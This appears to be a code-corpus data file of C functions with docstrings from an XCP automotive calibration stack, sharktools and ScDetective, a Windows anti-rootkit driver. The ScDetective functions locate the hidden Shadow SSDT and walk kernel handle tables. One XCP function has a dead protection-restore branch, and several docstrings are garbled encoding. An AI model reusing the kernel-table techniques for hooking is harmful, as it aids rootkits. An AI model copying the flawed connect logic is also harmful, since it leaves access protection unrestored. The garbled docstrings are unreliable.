{"docstring": "/*\n * General errors are reported with an console message in Sharktools.\n */\n", "func_signal": "static void\nfailure_message(const char *msg_format, va_list ap)", "code": "{\n  dprintf(\"sharktools: %s\", __FUNCTION__);\n  vfprintf(stderr, msg_format, ap);\n  dprintf(\"\\n\");\n}", "path": "src\\sharktools_core.c", "repo_name": "armenb/sharktools", "stars": 89, "license": "other", "language": "c", "size": 365}
{"docstring": "/**\n * Called by core Xcp to transmit data\n * @param data\n * @param len\n * @return\n */\n", "func_signal": "Std_ReturnType Xcp_Transmit(const void* data, int len)", "code": "{\n    uint8 buf[len+4];\n    PduInfoType pdu;\n    pdu.SduDataPtr = buf;\n    pdu.SduLength  = len+4;\n\n    SET_UINT16(buf, 0, len);\n    SET_UINT16(buf, 2, ++Xcp_EthCtrTx);\n    memcpy(buf+4, data, len);\n\n    return SoAdIf_Transmit(XCP_PDU_ID_TX, &pdu);\n}", "path": "source\\XcpOnEth.c", "repo_name": "elupus/autosar-xcp", "stars": 89, "license": "None", "language": "c", "size": 204}
{"docstring": "/**\n * Xcp_Recieve_Main is the main process that executes all received commands.\n *\n * The function queues up replies for transmission. Which will be sent\n * when Xcp_Transmit_Main function is called.\n */\n", "func_signal": "void Xcp_Recieve_Main()", "code": "{\n    FIFO_FOR_READ(Xcp_FifoRx, it) {\n        uint8 pid = GET_UINT8(it->data,0);\n\n        /* ignore commands when we are not connected */\n        if(!Xcp_Connected && pid != XCP_PID_CMD_STD_CONNECT\n                          && pid != XCP_PID_CMD_STD_TRANSPORT_LAYER_CMD) {\n            continue;\n        }\n\n        /* process stim commands */\n        if(pid <= XCP_PID_CMD_STIM_LAST){\n\n#if(XCP_FEATURE_PROTECTION)\n            if(Xcp_Config.XcpProtect & XCP_PROTECT_STIM) {\n                Xcp_TxError(XCP_ERR_ACCESS_LOCKED);\n                continue;\n            }\n#endif\n\n            if(Xcp_Recieve_Stim(pid, it) == E_OK) {\n                it = NULL;\n            }\n            continue;\n        }\n\n        /* process standard commands */\n        Xcp_CmdListType* cmd = Xcp_CmdList+pid;\n        if(cmd->fun) {\n\n#if(XCP_FEATURE_PROTECTION)\n            if(cmd->lock & Xcp_Config.XcpProtect) {\n                Xcp_TxError(XCP_ERR_ACCESS_LOCKED);\n                continue;\n            }\n#endif\n\n            if(cmd->len && it->len < cmd->len) {\n                DEBUG(DEBUG_HIGH, \"Xcp_RxIndication_Main - Len %d to short for %u\\n\", it->len, pid);\n                return;\n            }\n            cmd->fun(pid, it->data+1, it->len-1);\n        } else {\n            Xcp_TxError(XCP_ERR_CMD_UNKNOWN);\n        }\n    }\n}", "path": "source\\Xcp.c", "repo_name": "elupus/autosar-xcp", "stars": 89, "license": "None", "language": "c", "size": 204}
{"docstring": "/**\n * Replaces the DAQ list pointer at given index\n * with the given value\n * @param next New daq list pointer\n * @param index Will replace the linked list at this position\n * @return Old value for the pointer\n */\n", "func_signal": "static Xcp_DaqListType * Xcp_ReplaceDaqLink(uint8 index, Xcp_DaqListType * next)", "code": "{\n    /* find first dynamic and last predefined */\n    Xcp_DaqListType *first = Xcp_Config.XcpDaqList, *daq = NULL;\n    for(int i = 0; i < index; i++) {\n        daq   = first;\n        first = first->XcpNextDaq;\n    }\n\n    if(daq) {\n        daq->XcpNextDaq       = next;\n    } else {\n        Xcp_Config.XcpDaqList = next;\n    }\n\n    return first;\n}", "path": "source\\Xcp.c", "repo_name": "elupus/autosar-xcp", "stars": 89, "license": "None", "language": "c", "size": 204}
{"docstring": "/**\n * Write a character to memory\n * @return\n */\n", "func_signal": "static void Xcp_MtaWriteMemory(Xcp_MtaType* mta, uint8* data, int len)", "code": "{\n    memcpy((void*)mta->address, data, len);\n    mta->address += len;\n}", "path": "source\\Xcp_Memory.c", "repo_name": "elupus/autosar-xcp", "stars": 89, "license": "None", "language": "c", "size": 204}
{"docstring": "/**************************************************************************/\n/**************************************************************************/\n/**************************** GENERIC COMMANDS ****************************/\n/**************************************************************************/\n/**************************************************************************/\n", "func_signal": "static Std_ReturnType Xcp_CmdConnect(uint8 pid, void* data, int len)", "code": "{\n    uint8 mode = GET_UINT8(data, 0);\n    DEBUG(DEBUG_HIGH, \"Received connect mode %x\\n\", mode);\n\n    if(mode != 0) {\n        RETURN_ERROR(XCP_ERR_CMD_UNKNOWN, \"Xcp_CmdConnect\\n\");\n    }\n\n#if(BYTE_ORDER == BIG_ENDIAN)\n    int endian = 1;\n#else\n    int endian = 0;\n#endif\n\n    Xcp_Connected = 1;\n\n    if(!Xcp_Connected) {\n        /* restore varius state on a new connections */\n        Xcp_Config.XcpProtect = Xcp_ConfigOriginal->XcpProtect;\n    }\n\n    FIFO_GET_WRITE(Xcp_FifoTx, e) {\n        FIFO_ADD_U8 (e, XCP_PID_RES);\n        /* RESSOURCE */\n        FIFO_ADD_U8 (e, (!!XCP_FEATURE_CALPAG) << 0 /* CAL/PAG */\n                      | (!!XCP_FEATURE_DAQ)    << 2 /* DAQ     */\n                      | (!!XCP_FEATURE_STIM)   << 3 /* STIM    */\n                      | (!!XCP_FEATURE_PGM)    << 4 /* PGM     */);\n        /* COMM_MODE_BASIC */\n        FIFO_ADD_U8 (e, endian << 0 /* BYTE ORDER */\n                      | 0 << 1 /* ADDRESS_GRANULARITY */\n                      | (!!XCP_FEATURE_BLOCKMODE) << 6 /* SLAVE_BLOCK_MODE    */\n                      | 0 << 7 /* OPTIONAL */);\n        FIFO_ADD_U8 (e, XCP_MAX_CTO);\n        FIFO_ADD_U16(e, XCP_MAX_DTO);\n        FIFO_ADD_U8 (e, XCP_PROTOCOL_MAJOR_VERSION  << 4);\n        FIFO_ADD_U8 (e, XCP_TRANSPORT_MAJOR_VERSION << 4);\n    }\n\n    return E_OK;\n}", "path": "source\\Xcp.c", "repo_name": "elupus/autosar-xcp", "stars": 89, "license": "None", "language": "c", "size": 204}
{"docstring": "/**\n * Generic function that reads buffer from mta using get\n * @param val\n */\n", "func_signal": "static void Xcp_MtaReadGeneric(Xcp_MtaType* mta, uint8* data, int len)", "code": "{\n    while(len-- > 0) {\n        *(data++) = mta->get(mta);\n    }\n}", "path": "source\\Xcp_Memory.c", "repo_name": "elupus/autosar-xcp", "stars": 89, "license": "None", "language": "c", "size": 204}
{"docstring": "/**\n * Main processing function for stim packets\n *\n * Function will queue up received STIM packets on the odt they specify.\n *\n * @param pid Odt number this stim packet refer to.\n * @param it  Pointer to the receive buffer containing the data. This may be consumed.\n * @return E_OK, @param it have been consumed and are queued up on a odt for later processing\n *         E_NOT_OK, unable to queue STIM packet on requested odt\n */\n", "func_signal": "static Std_ReturnType Xcp_Recieve_Stim(uint8 pid, Xcp_BufferType* it)", "code": "{\n    uint16 daqNr = 0;\n    if       (XCP_IDENTIFICATION == XCP_IDENTIFICATION_RELATIVE_BYTE) {\n        daqNr = GET_UINT8(it->data, 1);\n    } else if(XCP_IDENTIFICATION == XCP_IDENTIFICATION_RELATIVE_WORD) {\n        daqNr = GET_UINT16(it->data, 1);\n    } else if(XCP_IDENTIFICATION == XCP_IDENTIFICATION_RELATIVE_WORD_ALIGNED) {\n        daqNr = GET_UINT16(it->data, 2);\n    }\n\n    Xcp_DaqListType* daq;\n    Xcp_OdtType*     odt;\n    Xcp_GetOdt(daqNr, pid, &daq, &odt);\n    if(!daq || !odt) {\n        RETURN_ERROR(XCP_ERR_CMD_SYNTAX, \"Unable to find daq: %u, odt:%u\", daqNr, pid);\n    }\n\n    if(daq->XcpParams.Mode & XCP_DAQLIST_MODE_STIM) {\n        Xcp_Fifo_Free(&Xcp_FifoRx, odt->XcpStim);\n        odt->XcpStim = it;\n        RETURN_SUCCESS();\n    }\n    RETURN_ERROR(XCP_ERR_CMD_SYNTAX, \"daq: %u is not a STIM list\", daqNr);\n}", "path": "source\\Xcp.c", "repo_name": "elupus/autosar-xcp", "stars": 89, "license": "None", "language": "c", "size": 204}
{"docstring": "/**\n * Flush data in buffer to DIO\n * @return\n */\n", "func_signal": "static void Xcp_MtaFlushDioPort(Xcp_MtaType* mta)", "code": "{\n    Dio_PortType port = mta->address / sizeof(Dio_PortLevelType);\n    Dio_WritePort(port, mta->buffer);\n    mta->buffer = 0;\n}", "path": "source\\Xcp_Memory.c", "repo_name": "elupus/autosar-xcp", "stars": 89, "license": "None", "language": "c", "size": 204}
{"docstring": "/**\n * Xcp_TxError sends an error message back to master\n * @param code is the error code requested\n */\n", "func_signal": "void Xcp_TxEvent(Xcp_EventType code)", "code": "{\n    FIFO_GET_WRITE(Xcp_FifoTx, e) {\n        SET_UINT8 (e->data, 0, XCP_PID_EV);\n        SET_UINT8 (e->data, 1, code);\n        e->len = 2;\n    }\n}", "path": "source\\Xcp.c", "repo_name": "elupus/autosar-xcp", "stars": 89, "license": "None", "language": "c", "size": 204}
{"docstring": "/**\n * Receive callback from CAN network layer\n *\n * This function is called by the lower layers (i.e. FlexRay Interface, TTCAN Interface\n * and Socket Adaptor or CDD) when an AUTOSAR XCP PDU has been received\n *\n * Reentrant for different XcpRxPduIds,\n * non reentrant for the same XcpRxPduId\n *\n * The function Xcp_<module>RxIndication might be called\n * by the Xcp modules environment in an interrupt context\n *\n * ServiceId: 0x03\n *\n * @param XcpRxPduId  PDU-ID that has been received\n * @param XcpRxPduPtr Pointer to SDU (Buffer of received payload)\n */\n", "func_signal": "void Xcp_CanIfRxIndication(\n        PduIdType    XcpRxPduId,\n        PduInfoType* XcpRxPduPtr)", "code": "{\n#if(XCP_DEV_ERROR_DETECT)\n    if(!Xcp_Inited) {\n        Det_ReportError(XCP_MODULE_ID, 0, 0x03, XCP_E_NOT_INITIALIZED);\n        return;\n    }\n\n    if(!XcpRxPduPtr) {\n        Det_ReportError(XCP_MODULE_ID, 0, 0x03, XCP_E_INV_POINTER);\n        return;\n    }\n\n    if(XcpRxPduId != XCP_PDU_ID_RX && XcpRxPduId != XCP_PDU_ID_BROADCAST) {\n        Det_ReportError(XCP_MODULE_ID, 0, 0x03, XCP_E_INVALID_PDUID);\n        return;\n    }\n#endif\n\n    /* TODO - How should the callback here be?\n     *        it should be general enough to\n     *        support all types of Xcp interfaces */\n    Xcp_RxIndication(XcpRxPduPtr->SduDataPtr, XcpRxPduPtr->SduLength);\n}", "path": "source\\XcpOnCan.c", "repo_name": "elupus/autosar-xcp", "stars": 89, "license": "None", "language": "c", "size": 204}
{"docstring": "/**\n * Called when the core of xcp have received a transport layer command\n * @param pid\n * @param data\n * @param len\n * @return\n */\n", "func_signal": "extern Std_ReturnType Xcp_CmdTransportLayer(uint8 pid, void* data, int len)", "code": "{\n#if(XCP_FEATURE_GET_SLAVE_ID == STD_ON)\n    uint8 id = GET_UINT8(data, 0);\n#endif\n\n    typedef enum {\n        XCP_CAN_CMD_SET_DAQ_ID   = 0xFD,\n        XCP_CAN_CMD_GET_DAQ_ID   = 0xFE,\n        XCP_CAN_CMD_GET_SLAVE_ID = 0xFF,\n    } Xcp_CanCmdType;\n\n#if(XCP_FEATURE_GET_SLAVE_ID == STD_ON)\n    if(id == XCP_CAN_CMD_GET_SLAVE_ID && len >= 5) {\n        return Xcp_CmdGetSlaveId(data+1, len-1);\n    }\n#endif\n\n    RETURN_ERROR(XCP_ERR_CMD_UNKNOWN, \"Unknown transport cmd:%u, len:%u\", id, len);\n}", "path": "source\\XcpOnCan.c", "repo_name": "elupus/autosar-xcp", "stars": 89, "license": "None", "language": "c", "size": 204}
{"docstring": "/* Process all entries in event channel */\n", "func_signal": "static void Xcp_ProcessChannel(Xcp_EventChannelType* ech)", "code": "{\n    for(int d = 0; d < ech->XcpEventChannelDaqCount; d++) {\n        Xcp_DaqListType* daq = ech->XcpEventChannelTriggeredDaqListRef[d];\n        if(!daq)\n            continue;\n\n        if(!(daq->XcpParams.Mode & XCP_DAQLIST_MODE_RUNNING))\n            continue;\n\n        if(!(daq->XcpParams.Mode & XCP_DAQLIST_MODE_RESUME) && !Xcp_Connected)\n            continue;\n\n        if((ech->XcpEventChannelCounter % daq->XcpParams.Prescaler) != 0)\n            continue;\n        Xcp_ProcessDaq(ech->XcpEventChannelTriggeredDaqListRef[d]);\n    }\n    ech->XcpEventChannelCounter++;\n}", "path": "source\\Xcp.c", "repo_name": "elupus/autosar-xcp", "stars": 89, "license": "None", "language": "c", "size": 204}
{"docstring": "/**\n * Read a character from a DIO channel\n * @return\n */\n", "func_signal": "static uint8 Xcp_MtaGetDioChan(Xcp_MtaType* mta)", "code": "{\n    if(Dio_ReadChannel(mta->address++) == STD_HIGH)\n        return 1;\n    else\n        return 0;\n}", "path": "source\\Xcp_Memory.c", "repo_name": "elupus/autosar-xcp", "stars": 89, "license": "None", "language": "c", "size": 204}
{"docstring": "/**\n * Callback for finished transmit of PDU\n *\n * This function is called by the lower layers (i.e. FlexRay Interface, TTCAN Interface\n * and Socket Adaptor or CDD) when an AUTOSAR XCP PDU has been transmitted\n *\n * Reentrant for different XcpTxPduIds, non reentrant for the same XcpTxPduId\n *\n * ServiceId: 0x02\n *\n * @param XcpRxPduId PDU-ID that has been transmitted\n */\n", "func_signal": "void Xcp_CanIfTxConfirmation(\n        PduIdType XcpTxPduId)", "code": "{\n#if(XCP_DEV_ERROR_DETECT)\n    if(!Xcp_Inited) {\n        Det_ReportError(XCP_MODULE_ID, 0, 0x02, XCP_E_INV_POINTER);\n        /* return E_NOT_OK */\n        return;\n    }\n#endif\n\n    /* TODO - mark message as transmitted and make place for a new one */\n}", "path": "source\\XcpOnCan.c", "repo_name": "elupus/autosar-xcp", "stars": 89, "license": "None", "language": "c", "size": 204}
{"docstring": "/**\n * Scheduled function of the event channel\n * @param channel\n */\n", "func_signal": "void Xcp_MainFunction_Channel(unsigned channel)", "code": "{\n    DET_VALIDATE_NRV(Xcp_Inited, 0x04, XCP_E_NOT_INITIALIZED);\n    Xcp_ProcessChannel(Xcp_Config.XcpEventChannel+channel);\n\n}", "path": "source\\Xcp.c", "repo_name": "elupus/autosar-xcp", "stars": 89, "license": "None", "language": "c", "size": 204}
{"docstring": "/**\n * Transport protocol agnostic transmit function called by Xcp core system\n *\n * @param data\n * @param len\n * @return\n */\n", "func_signal": "Std_ReturnType Xcp_Transmit(const void* data, int len)", "code": "{\n    PduInfoType pdu;\n    pdu.SduDataPtr = (uint8*)data;\n    pdu.SduLength  = len;\n    return CanIf_Transmit(XCP_PDU_ID_TX, &pdu);\n}", "path": "source\\XcpOnCan.c", "repo_name": "elupus/autosar-xcp", "stars": 89, "license": "None", "language": "c", "size": 204}
{"docstring": "/**\n * Generic function that writes character to mta using put\n * @param val\n */\n", "func_signal": "static void Xcp_MtaWriteGeneric(Xcp_MtaType* mta, uint8* data, int len)", "code": "{\n    while(len-- > 0) {\n        mta->put(mta, *(data++));    }\n}", "path": "source\\Xcp_Memory.c", "repo_name": "elupus/autosar-xcp", "stars": 89, "license": "None", "language": "c", "size": 204}
{"docstring": "/**************************************************************************/\n/**************************************************************************/\n/*************************** DAQ/STIM COMMANDS ****************************/\n/**************************************************************************/\n/**************************************************************************/\n", "func_signal": "static Std_ReturnType Xcp_CmdClearDaqList(uint8 pid, void* data, int len)", "code": "{\n    uint16 daqListNumber = GET_UINT16(data, 1);\n    if(daqListNumber >= Xcp_Config.XcpMaxDaq || daqListNumber < Xcp_Config.XcpMinDaq )\n        RETURN_ERROR(XCP_ERR_OUT_OF_RANGE, \"Error: Daqlist number out of range\\n\");\n\n    Xcp_DaqListType* daq = Xcp_Config.XcpDaqList;\n    for( int i = 0 ; i < daqListNumber ; i++ ) {\n        daq = daq->XcpNextDaq;\n    }\n\n    if(daq->XcpParams.Mode & XCP_DAQLIST_MODE_RUNNING)\n        RETURN_ERROR(XCP_ERR_DAQ_ACTIVE, \"Error: DAQ running\\n\");\n\n    Xcp_OdtEntryType* entry;\n\n    Xcp_OdtType* odt = daq->XcpOdt;\n    for( int i = 0; i < daq->XcpOdtCount ;  i++ ) {\n        odt->XcpOdtEntriesValid = 0;\n        entry = odt->XcpOdtEntry;\n        for(int j = 0; j < odt->XcpOdtEntriesCount ;  j++ ) {\n            entry->XcpOdtEntryAddress   = 0;\n            entry->XcpOdtEntryExtension = 0;\n            entry->XcpOdtEntryLength    = 0;\n            entry->BitOffSet            = 0xFF;\n            entry = entry->XcpNextOdtEntry;\n        }\n        odt = odt->XcpNextOdt;\n    }\n\tRETURN_SUCCESS();\n}", "path": "source\\Xcp.c", "repo_name": "elupus/autosar-xcp", "stars": 89, "license": "None", "language": "c", "size": 204}
{"docstring": "/**\n * Set the MTA pointer to given address on given extension\n * @param address\n * @param extension\n */\n", "func_signal": "void Xcp_MtaInit(Xcp_MtaType* mta, intptr_t address, uint8 extension)", "code": "{\n    mta->address   = address;\n    mta->extension = extension;\n    mta->read      = Xcp_MtaReadGeneric;\n    mta->write     = Xcp_MtaWriteGeneric;\n    mta->flush     = NULL;\n\n    if(extension == XCP_MTA_EXTENSION_MEMORY) {\n        mta->get   = Xcp_MtaGetMemory;\n        mta->put   = Xcp_MtaPutMemory;\n        mta->read  = Xcp_MtaReadMemory;\n        mta->write = Xcp_MtaWriteMemory;\n#ifdef XCP_DEBUG_MEMORY\n    } else if(extension == XCP_MTA_EXTENSION_DEBUG) {\n        mta->address = (intptr_t)g_XcpDebugMemory + address;\n        mta->get   = Xcp_MtaGetMemory;\n        mta->put   = Xcp_MtaPutMemory;\n#endif\n    } else if(extension == XCP_MTA_EXTENSION_FLASH) {\n        mta->get   = Xcp_MtaGetMemory;\n        mta->put   = NULL;\n        mta->read  = Xcp_MtaReadGeneric;\n        mta->write = NULL;\n#if(XCP_FEATURE_DIO == STD_ON)\n    } else if(extension == XCP_MTA_EXTENSION_DIO_PORT) {\n        mta->get   = Xcp_MtaGetDioPort;\n        mta->put   = Xcp_MtaPutDioPort;\n        mta->flush = Xcp_MtaFlushDioPort;\n        /* if not aligned to start of port, we must fill buffer */\n        unsigned int offset = address % sizeof(Dio_PortLevelType);\n        mta->address -= offset;\n        while(offset--)\n            Xcp_MtaGetDioPort(mta);\n    } else if(extension == XCP_MTA_EXTENSION_DIO_CHAN) {\n        mta->get   = Xcp_MtaGetDioChan;\n        mta->put   = Xcp_MtaPutDioChan;\n#endif\n    } else {\n        mta->get   = NULL;\n        mta->put   = NULL;\n        mta->read  = NULL;\n        mta->write = NULL;\n    }\n}", "path": "source\\Xcp_Memory.c", "repo_name": "elupus/autosar-xcp", "stars": 89, "license": "None", "language": "c", "size": 204}
{"docstring": "/**\n * Receive callback from Eth network layer\n *\n * This function is called by the lower layers (i.e. FlexRay Interface, TTCAN Interface\n * and Socket Adaptor or CDD) when an AUTOSAR XCP PDU has been received\n *\n * Reentrant for different XcpRxPduIds,\n * non reentrant for the same XcpRxPduId\n *\n * The function Xcp_<module>RxIndication might be called\n * by the Xcp modules environment in an interrupt context\n *\n * ServiceId: 0x03\n *\n * @param XcpRxPduId  PDU-ID that has been received\n * @param XcpRxPduPtr Pointer to SDU (Buffer of received payload)\n */\n", "func_signal": "void Xcp_SoAdIfRxIndication   (PduIdType XcpRxPduId, PduInfoType* XcpRxPduPtr)", "code": "{\n    DET_VALIDATE_NRV(g_XcpConfig                   , 0x03, XCP_E_NOT_INITIALIZED);\n    DET_VALIDATE_NRV(XcpRxPduPtr                   , 0x03, XCP_E_INV_POINTER);\n    DET_VALIDATE_NRV(XcpRxPduId == CANIF_PDU_ID_XCP, 0x03, XCP_E_INVALID_PDUID);\n    DET_VALIDATE_NRV(XcpRxPduPtr->SduLength > 4    , 0x03, XCP_E_INVALID_PDUID);\n\n    uint16 ctr = (XcpRxPduPtr->SduDataPtr[3] << 8) | XcpRxPduPtr->SduDataPtr[2];\n    if(Xcp_Connected && ctr && ctr != Xcp_EthCtrRx) {\n        DEBUG(DEBUG_HIGH, \"Xcp_SoAdRxIndication - ctr:%d differs from expected: %d\\n\", ctr, Xcp_EthCtrRx);\n    }\n\n    Xcp_EthCtrRx = ctr+1;\n    Xcp_RxIndication(XcpRxPduPtr->SduDataPtr+4, XcpRxPduPtr->SduLength-4);\n}", "path": "source\\XcpOnEth.c", "repo_name": "elupus/autosar-xcp", "stars": 89, "license": "None", "language": "c", "size": 204}
{"docstring": "///////////////////////////////////////////////////////////////////////////////////\n//\n//\t\u02b5\u05a3\u00f6\u0675\u01f0Shadow SSDT \u05b7\n//\tAddressInfo\u03aa\u05b8\ub8fb\n//\t\t\t  Length\u03aa\u0773\u05b8\n//\t\u063a\u05b7\n//\n///////////////////////////////////////////////////////////////////////////////////\n", "func_signal": "ULONG \nGetShadowSsdtCurrentAddresses(\n    PSSDT_ADDRESS   AddressInfo, \n    PULONG          Length\n    )", "code": "{\n    PSYSTEM_SERVICE_TABLE KeServiceDescriptorTableShadow = NULL;\n    ULONG NumberOfService = 0;\n    ULONG ServiceId = 0;\n    PKAPC_STATE ApcState;\n    ULONG i;\n    \n    if (AddressInfo == NULL || Length == NULL)\n    {\n        KdPrint((\"[GetShadowSsdtCurrentAddresses] \u0427\"));\n        return 0;\n    }\n\n    //KdPrint((\"pid = %d\", PsGetCurrentProcessId()));\n    ServiceId = (ULONG)PsGetCurrentProcessId();\n\n    if (!g_CsrssProcess) {\n        PsLookupProcessByProcessId((PVOID)ScPsGetCsrssProcessId(), &g_CsrssProcess);\n    }\n\n    KeServiceDescriptorTableShadow = GetKeServiceDescriptorTableShadow();\n\n    if (KeServiceDescriptorTableShadow == NULL)  \n    {\n        KdPrint((\"[GetShadowSsdtCurrentAddresses] GetKeServiceDescriptorTableShadow failed\"));\n        return 0;\n    }\n\n    NumberOfService = KeServiceDescriptorTableShadow->NumberOfService;\n    if (Length[0] < NumberOfService * sizeof(SSDT_ADDRESS))\n    {\n        Length[0] = NumberOfService * sizeof(SSDT_ADDRESS);\n        return 0;\n    }\n\n    ApcState = ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC_STATE), MEM_TAG);\n    KeStackAttachProcess((PRKPROCESS)g_CsrssProcess, ApcState);\n\n    for (ServiceId = 0; ServiceId < NumberOfService; ServiceId ++)\n    {\n        AddressInfo[ServiceId].FunAddress = (ULONG)\n            KeServiceDescriptorTableShadow->ServiceTableBase[ServiceId];\n        AddressInfo[ServiceId].nIndex = ServiceId;\n    }\n\n    KeUnstackDetachProcess(ApcState);\n    ExFreePool(ApcState);\n\n    Length[0] = NumberOfService * sizeof(SSDT_ADDRESS);\n    return NumberOfService;\n}", "path": "ScDetective_Driver\\ScDetective\\ssdt\\ssdt_shadow.c", "repo_name": "kedebug/ScDetective", "stars": 83, "license": "None", "language": "c", "size": 425}
{"docstring": "//////////////////////////////////////////////////////////////////////////\n", "func_signal": "PEPROCESS ScPsGetSystemIdleProcess()", "code": "{\n    PETHREAD IdleThread;\n    \n    //\n    // see offset_kpcr_IdleProcess\n    // This offset is no changed on xp and windows 7\n    //\n    __asm {\n        mov eax, fs:[0x12c]\n        mov IdleThread, eax\n    }\n    return ScPsGetThreadProcess(IdleThread);\n}", "path": "ScDetective_Driver\\ScDetective\\Process\\Process.c", "repo_name": "kedebug/ScDetective", "stars": 83, "license": "None", "language": "c", "size": 425}
{"docstring": "//////////////////////////////////////////////////////////////////////////\n", "func_signal": "BOOLEAN \nEnumHandleCallback(\n    PHANDLE_TABLE_ENTRY HandleTableEntry, \n    HANDLE Handle, \n    PVOID EnumParameter\n    )", "code": "{\n    if (ARGUMENT_PRESENT(EnumParameter) &&\n        Handle == *(PHANDLE)EnumParameter) {\n        *(PULONG)EnumParameter = (ULONG)HandleTableEntry;\n        return TRUE;\n    }\n    return FALSE;\n}", "path": "ScDetective_Driver\\ScDetective\\Protect\\ScProtect.c", "repo_name": "kedebug/ScDetective", "stars": 83, "license": "None", "language": "c", "size": 425}
{"docstring": "//////////////////////////////////////////////////////////////////////////\n", "func_signal": "ULONG GetServiceIdByName(PCHAR FunctionName)", "code": "{\n    NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;\n    ULONG ServiceId = 0;\n    UNICODE_STRING RootName;\n    PUNICODE_STRING KernelLinkName = NULL;\n    HANDLE FileHandle, SectionHandle;\n    OBJECT_ATTRIBUTES ObjectAttributes;\n    IO_STATUS_BLOCK ioStatus;\n    PVOID BaseAddress = NULL;\n    size_t ViewSize = 0;\n    PIMAGE_DOS_HEADER pDosHeader = NULL;\n    PIMAGE_NT_HEADERS pNtHeader = NULL;\n    PIMAGE_OPTIONAL_HEADER pOptionalHeader = NULL;\n    PIMAGE_EXPORT_DIRECTORY pExportDirectory = NULL;\n    PULONG arrayOfFunctionNames = NULL;\n    PULONG arrayOfFunctionAddresses = NULL;\n    PWORD  arrayOfFunctionOrdinals = NULL;\n    ULONG  i, funcOrdinal, funcAddress, number;\n    PCHAR  funcName = NULL;\n\n    RtlInitUnicodeString(&RootName, L\"\\\\SystemRoot\");\n    KernelLinkName = Convert2KernelLinkName(&RootName);\n    if (KernelLinkName == NULL)  return 0;\n    \n    ntStatus = RtlAppendUnicodeToString(KernelLinkName, L\"\\\\system32\\\\ntdll.dll\");\n    if (!NT_SUCCESS(ntStatus)) {\n        ExFreePoolWithTag(KernelLinkName, MEM_TAG);\n        return 0;\n    }\n    InitializeObjectAttributes(&ObjectAttributes, KernelLinkName, \n                               OBJ_CASE_INSENSITIVE, 0, 0);\n\n    ntStatus = ZwOpenFile(&FileHandle, FILE_EXECUTE | SYNCHRONIZE, \n                          &ObjectAttributes, &ioStatus, \n                          FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);\n    if (!NT_SUCCESS(ntStatus))  return 0;\n\n    ObjectAttributes.ObjectName = NULL;\n\n    ntStatus = ZwCreateSection(&SectionHandle, SECTION_ALL_ACCESS, \n                               &ObjectAttributes, 0, \n                               PAGE_EXECUTE, SEC_IMAGE, FileHandle);\n    if (!NT_SUCCESS(ntStatus)) { \n        ZwClose(FileHandle); \n        return 0; \n    }\n    ntStatus = ZwMapViewOfSection(SectionHandle, NtCurrentProcess(), \n                                  &BaseAddress, 0, 1024, 0, &ViewSize, \n                                  ViewShare, MEM_TOP_DOWN, PAGE_READWRITE);\n    if (!NT_SUCCESS(ntStatus)) { \n        ZwClose(SectionHandle); \n        ZwClose(FileHandle); \n        return 0; \n    }\n    pDosHeader = (PIMAGE_DOS_HEADER)BaseAddress;\n    pNtHeader  = (PIMAGE_NT_HEADERS)((ULONG)BaseAddress + pDosHeader->e_lfanew);\n    pOptionalHeader = &(pNtHeader->OptionalHeader);\n    pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + (ULONG)BaseAddress);\n\n    arrayOfFunctionNames = (PULONG)(pExportDirectory->AddressOfNames + (ULONG)BaseAddress);\n    arrayOfFunctionAddresses = (PULONG)(pExportDirectory->AddressOfFunctions + (ULONG)BaseAddress);\n    arrayOfFunctionOrdinals = (PWORD)(pExportDirectory->AddressOfNameOrdinals + (ULONG)BaseAddress);\n\n    for (i = 0; i < pExportDirectory->NumberOfNames; i++) {\n\n        funcName = (PCHAR)(arrayOfFunctionNames[i] + (PCHAR)BaseAddress);\n        funcOrdinal = arrayOfFunctionOrdinals[i] + pExportDirectory->Base - 1;\n        funcAddress = (ULONG)(arrayOfFunctionAddresses[funcOrdinal] + (PCHAR)BaseAddress);\n\n        if (funcName[0] == 'N' && funcName[1] == 't') {\n\n            number = *((PULONG)(funcAddress + 1));\n            if (*(PBYTE)funcAddress != MOV_OPCODE)  continue;\n            if (number > pExportDirectory->NumberOfNames)  continue;\n\n            if (strstr(funcName, FunctionName) != 0) {\n\n                ServiceId = number;  break;\n            }\n        }\n    }\n    ZwUnmapViewOfSection(NtCurrentProcess(), BaseAddress);\n    ZwClose(SectionHandle);\n    ZwClose(FileHandle);\n    ExFreePoolWithTag(KernelLinkName, MEM_TAG);\n    return ServiceId;\n}", "path": "ScDetective_Driver\\ScDetective\\ssdt\\ssdt.c", "repo_name": "kedebug/ScDetective", "stars": 83, "license": "None", "language": "c", "size": 425}
{"docstring": "///////////////////////////////////////////////////////////////////////////////////\n//\n//\t\u02b5\u05a3\u00f6\u0675\u01f0Shadow SSDT \u05b7\n//\tvoid\n//\tShadow ssdt table\n//\n///////////////////////////////////////////////////////////////////////////////////\n", "func_signal": "PSYSTEM_SERVICE_TABLE \nGetKeServiceDescriptorTableShadow(VOID)", "code": "{\n    PSYSTEM_SERVICE_TABLE ShadowTable = NULL;\n    ULONG   ServiceTableAddress = 0;\n    PUCHAR  cPtr = NULL; \n\n    for (cPtr = (PUCHAR)KeAddSystemServiceTable;\n         cPtr < (PUCHAR)KeAddSystemServiceTable + PAGE_SIZE;\n         cPtr += 1 )\n    {\n        if (!MmIsAddressValid(cPtr))  continue;\n\n        ServiceTableAddress = *(PULONG)cPtr;\n        if (!MmIsAddressValid((PVOID)ServiceTableAddress)) continue;\n\n        if (memcmp((PVOID)ServiceTableAddress, &KeServiceDescriptorTable, 16) == 0)\n        {\n            if ((PVOID)ServiceTableAddress == &KeServiceDescriptorTable) continue;\n            ShadowTable = (PSYSTEM_SERVICE_TABLE)ServiceTableAddress;\n            ShadowTable ++;\n            return ShadowTable;\n        }\n    }\n    return NULL;\n}", "path": "ScDetective_Driver\\ScDetective\\ssdt\\ssdt_shadow.c", "repo_name": "kedebug/ScDetective", "stars": 83, "license": "None", "language": "c", "size": 425}
